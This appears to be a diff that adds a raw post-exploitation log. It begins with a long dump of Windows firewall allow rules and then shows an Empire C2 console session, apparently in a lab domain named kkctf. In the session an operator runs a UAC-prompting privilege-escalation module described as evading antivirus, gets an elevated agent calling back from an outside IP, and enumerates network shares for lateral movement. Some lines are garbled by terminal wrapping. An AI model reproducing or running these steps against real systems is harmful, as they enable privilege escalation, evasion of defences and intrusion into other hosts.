+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : *
+RemotePort      : 137
+LocalPort       : *
+ApplicationName : File and Printer Sharing (NB-Name-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : 137
+ApplicationName : File and Printer Sharing (NB-Name-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : *
+RemotePort      : 445
+LocalPort       : *
+ApplicationName : File and Printer Sharing (SMB-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : 445
+ApplicationName : File and Printer Sharing (SMB-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : *
+RemotePort      : 139
+LocalPort       : *
+ApplicationName : File and Printer Sharing (NB-Session-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : 139
+ApplicationName : File and Printer Sharing (NB-Session-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : 1900
+LocalPort       : *
+ApplicationName : Windows Peer to Peer Collaboration Foundation (SSDP-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : 1900
+ApplicationName : Windows Peer to Peer Collaboration Foundation (SSDP-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : *
+RemotePort      : 3540
+LocalPort       : *
+ApplicationName : Windows Peer to Peer Collaboration Foundation (PNRP-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : 3540
+ApplicationName : Windows Peer to Peer Collaboration Foundation (PNRP-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : 3702
+LocalPort       : *
+ApplicationName : Windows Peer to Peer Collaboration Foundation (WSD-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : 3702
+ApplicationName : Windows Peer to Peer Collaboration Foundation (WSD-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : *
+ApplicationName : Windows Peer to Peer Collaboration Foundation (TCP-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : *
+ApplicationName : Windows Peer to Peer Collaboration Foundation (TCP-In)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : RPC-EPMap
+ApplicationName : Remote Volume Management (RPC-EPMAP)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : RPC
+ApplicationName : Remote Volume Management - Virtual Disk Service Loader (RPC)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : RPC
+ApplicationName : Remote Volume Management - Virtual Disk Service (RPC)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : RPC-EPMap
+ApplicationName : Remote Volume Management (RPC-EPMAP)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : RPC
+ApplicationName : Remote Volume Management - Virtual Disk Service Loader (RPC)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : RPC
+ApplicationName : Remote Volume Management - Virtual Disk Service (RPC)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : 1900
+LocalPort       : *
+ApplicationName : Windows Collaboration Computer Name Registration Service (SSD
+                  P-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : 1900
+ApplicationName : Windows Collaboration Computer Name Registration Service (SSD
+                  P-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : *
+RemotePort      : 3540
+LocalPort       : *
+ApplicationName : Windows Collaboration Computer Name Registration Service (PNR
+                  P-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : 3540
+ApplicationName : Windows Collaboration Computer Name Registration Service (PNR
+                  P-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : 3540
+LocalPort       : *
+ApplicationName : HomeGroup Out (PNRP)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : 3540
+ApplicationName : HomeGroup In (PNRP)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : 3587
+LocalPort       : *
+ApplicationName : HomeGroup Out
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : 3587
+ApplicationName : HomeGroup In
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : 10245
+ApplicationName : Windows Media Player Network Sharing Service (HTTP-Streaming-
+                  In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : *
+ApplicationName : Windows Media Player Network Sharing Service (UPnPHost-Out)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : *
+ApplicationName : Windows Media Player Network Sharing Service (TCP-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : *
+ApplicationName : Windows Media Player Network Sharing Service (TCP-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : *
+ApplicationName : Windows Media Player Network Sharing Service (UDP-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : *
+ApplicationName : Windows Media Player Network Sharing Service (UDP-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : *
+ApplicationName : Windows Media Player Network Sharing Service (Streaming-TCP-O
+                  ut)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : *
+ApplicationName : Windows Media Player Network Sharing Service (Streaming-UDP-O
+                  ut)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : *
+ApplicationName : Windows Media Player Network Sharing Service (Streaming-UDP-I
+                  n)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : 10243
+LocalPort       : *
+ApplicationName : Windows Media Player Network Sharing Service (HTTP-Streaming-
+                  Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : 10243
+ApplicationName : Windows Media Player Network Sharing Service (HTTP-Streaming-
+                  In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : *
+ApplicationName : Windows Media Player Network Sharing Service (UPnP-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : 2869
+ApplicationName : Windows Media Player Network Sharing Service (UPnP-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : 1900
+LocalPort       : *
+ApplicationName : Windows Media Player Network Sharing Service (SSDP-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : 1900
+ApplicationName : Windows Media Player Network Sharing Service (SSDP-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : 2177
+LocalPort       : *
+ApplicationName : Windows Media Player Network Sharing Service (qWave-TCP-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : 2177
+ApplicationName : Windows Media Player Network Sharing Service (qWave-TCP-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : 2177
+LocalPort       : *
+ApplicationName : Windows Media Player Network Sharing Service (qWave-UDP-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : 2177
+ApplicationName : Windows Media Player Network Sharing Service (qWave-UDP-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : *
+ApplicationName : Windows Media Player Network Sharing Service (TCP-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : *
+ApplicationName : Windows Media Player Network Sharing Service (TCP-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : *
+ApplicationName : Windows Media Player Network Sharing Service (UDP-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : *
+ApplicationName : Windows Media Player Network Sharing Service (UDP-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : *
+ApplicationName : Windows Media Player Network Sharing Service (Streaming-TCP-O
+                  ut)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : *
+ApplicationName : Windows Media Player Network Sharing Service (Streaming-UDP-O
+                  ut)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : *
+ApplicationName : Windows Media Player Network Sharing Service (Streaming-UDP-I
+                  n)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : *
+RemotePort      : 10243
+LocalPort       : *
+ApplicationName : Windows Media Player Network Sharing Service (HTTP-Streaming-
+                  Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : 10243
+ApplicationName : Windows Media Player Network Sharing Service (HTTP-Streaming-
+                  In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : *
+RemotePort      : 2177
+LocalPort       : *
+ApplicationName : Windows Media Player Network Sharing Service (qWave-TCP-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : 2177
+ApplicationName : Windows Media Player Network Sharing Service (qWave-TCP-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : *
+RemotePort      : 2177
+LocalPort       : *
+ApplicationName : Windows Media Player Network Sharing Service (qWave-UDP-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : 2177
+ApplicationName : Windows Media Player Network Sharing Service (qWave-UDP-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : *
+ApplicationName : Windows Media Player (TCP-Out)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : *
+ApplicationName : Windows Media Player (UDP-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : *
+ApplicationName : Windows Media Player (UDP-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : *
+ApplicationName : Windows Media Player x86 (TCP-Out)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : *
+ApplicationName : Windows Media Player x86 (UDP-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : *
+ApplicationName : Windows Media Player x86 (UDP-In)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : 162
+ApplicationName : SNMP Trap Service (UDP In)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : 162
+ApplicationName : SNMP Trap Service (UDP In)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : 445
+ApplicationName : Netlogon Service (NP-In)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : 443
+ApplicationName : Secure Socket Tunneling Protocol (SSTP-In)
+
+(Empire: exfiltration/egresscheck) > usemodule privesc/ask
+(Empire: privesc/ask) > info
+
+           Name: Invoke-Ask
+         Module: privesc/ask
+     NeedsAdmin: False
+      OpsecSafe: False
+   MinPSVersion: 2
+     Background: True
+OutputExtension: None
+
+Authors:
+  Jack64
+
+Description:
+  Leverages Start-Process' -Verb runAs option inside a YES-
+  Required loop to prompt the user for a high integrity
+  context before running the agent code. UAC will report
+  Powershell is requesting Administrator privileges. Because
+  this does not use the BypassUAC DLLs, it should not trigger
+  any AV alerts.
+
+Options:
+
+  Name       Required    Value                     Description
+  ----       --------    -------                   -----------
+  Listener   True                                  Listener to use.                        
+  UserAgent  False       default                   User-agent string to use for the staging
+                                                   request (default, none, or other).      
+  Proxy      False       default                   Proxy to use for request (default, none,
+                                                   or other).                              
+  Agent      True        RBH21WLMXZGPTSSK          Agent to run module on.                 
+  ProxyCreds False       default                   Proxy credentials                       
+                                                   ([domain\]username:password) to use for 
+                                                   request (default, none, or other).      
+
+(Empire: privesc/ask) > execute
+[!] Error: Required module option missing.
+(Empire: privesc/ask) > set Listener test
+(Empire: privesc/ask) > execute
+[>] Module is not opsec safe, run? [y/N] y
+(Empire: privesc/ask) > 
+Job started: Debug32_bf8s4
+[+] Initial agent WTFYFLXHH2HM41Y1 from 73.245.208.66 now active
+
+[*] Successfully elevated!
+
+shell whoami
+(Empire: WTFYFLXHH2HM41Y1) > 
+kkctf\administrator
+
+(Empire: WTFYFLXHH2HM41Y1) > shell net share
+(Empire: WTFYFLXHH2HM41Y1) > 
+Share name   Resource                        Remark
+
+-------------------------------------------------------------------------------
+C$           C:\                             Default share                     
+IPC$                                         Remote IPC                        
+ADMIN$       C:\Windows                      Remote Admin                      
+The command completed successfully
+
+
+shell ping 192.168.4.107
+(Empire: WTFYFLXHH2HM41Y1) > 
+Pinging 192.168.4.107 with 32 bytes of data:
+Reply from 192.168.4.107: bytes=32 time<1ms TTL=128
+Reply from 192.168.4.107: bytes=32 time<1ms TTL=128
+Reply from 192.168.4.107: bytes=32 time<1ms TTL=128
+Reply from 192.168.4.107: bytes=32 time<1ms TTL=128
+
+Ping statistics for 192.168.4.107:
+    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
+Approximate round trip times in milli-seconds:
+    Minimum = 0ms, Maximum = 0ms, Average = 0ms
+    
+(Empire: WTFYFLXHH2HM41Y1) > shell ping -a 192.168.4.107
+(Empire: WTFYFLXHH2HM41Y1) > 
+Pinging win10ent.kkctf.local [192.168.4.107] with 32 bytes of data:
+Reply from 192.168.4.107: bytes=32 time<1ms TTL=128
+Reply from 192.168.4.107: bytes=32 time<1ms TTL=128
+Reply from 192.168.4.107: bytes=32 time<1ms TTL=128
+Reply from 192.168.4.107: bytes=32 time<1ms TTL=128
+
+hare -Computername win10ent> shell Get-WmiObject -class Win32_s 
+(Empire: WTFYFLXHH2HM41Y1) > 
+Name                       Path                       Description              
+----                       ----                       -----------              
+ADMIN$                     C:\Windows                 Remote Admin             
+C$                         C:\                        Default share            
+IPC$                                                  Remote IPC               
+share1                     C:\share1
+
+pwd
+(Empire: WTFYFLXHH2HM41Y1) > 
+Path                                                                           
+----                                                                           
+C:\Users\administrator.KKCTF\Documents
+
+(Empire: WTFYFLXHH2HM41Y1) > shell Test-Path \\win10ent\share1
+(Empire: WTFYFLXHH2HM41Y1) > 
+True
+
+nt\share1WTFYFLXHH2HM41Y1) > shell Get-ChildItem -Path \\win10e 
+(Empire: WTFYFLXHH2HM41Y1) > 
+Directory: \\win10ent\share1
+
+
+Mode                LastWriteTime     Length Name                              
+----                -------------     ------ ----                              
+-a---         3/30/2017   1:05 PM          0 Lateralmovefile.txt.txt           
+-a---         3/30/2017   1:06 PM   10811677 machinelearning.pdf               
+-a---        12/13/2016   8:21 PM         16 newtextfile.txt                   
+-a---         3/14/2017   4:20 PM      83738 ntlmsmbpackets.pcap               
+-a---         3/14/2017   4:19 PM   41310241 NTLMSMBwalltraffic.pcap           
+-a---         3/17/2017   6:01 PM   57783349 powershellmeterpreterhttpLM.pcap  
+-a---         3/17/2017   6:00 PM   47381875 powershellmeterpreterhttpLM2.pcap 
+-a---         3/17/2017   5:26 PM   60354628 powershellmethttp.pcap.pcapng     
+-a---         3/17/2017   5:44 PM  232253008 powershellmethttp2.pcap
+
+
+
+
+
+
